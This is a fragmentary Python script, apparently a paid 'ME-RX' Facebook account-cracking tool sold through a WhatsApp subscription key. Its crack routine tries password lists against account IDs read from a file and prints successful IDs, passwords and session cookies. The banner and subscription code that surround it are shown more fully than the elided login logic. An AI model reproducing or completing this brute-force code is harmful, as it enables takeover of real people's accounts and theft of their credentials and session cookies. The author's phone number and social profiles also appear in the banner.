...
princp=[]
try:
	prox= requests.get('https://github.com/ME-RX/ME-RX/blob/main/Approved.txt').text
...
os.system('espeak -a 300 " Welcome,   to,  Rabbi Hassan,  Tools"')
os.system('xdg-open https://www.facebook.com/itrabbyhassan')
def banner():
	os.system("clear")
	print (f"""
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mRABBI HASSAN ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Rabbi Hassan ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mME-RX ]   ║\33[1;34m   
╠══[Whatsapp                 • 01309140665 ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
╠══[VERSION                  • 0.0.2 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
def login():
	banner()
...
def crack_file():
	...
	print('\033[1;32m[ Put File Example:  /sdcard/ME-RX-OK.txt  Etc...]')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[ME-RX] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#ME-RX
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•ME-RX] {idf} • {pw}')     
				...
				#ME-RX
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•ME-RX-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " ME-RX,  Ok,  id"')
...
def Subscraption():
	...
	if key1 in r1:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m RABBI HASSAN, ToOLs Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+ME-RX+key1)
		...
		os.system('am start https://wa.me/+8801309140665?text=' + tks)
		Subscraption() 
Subscraption() 
login()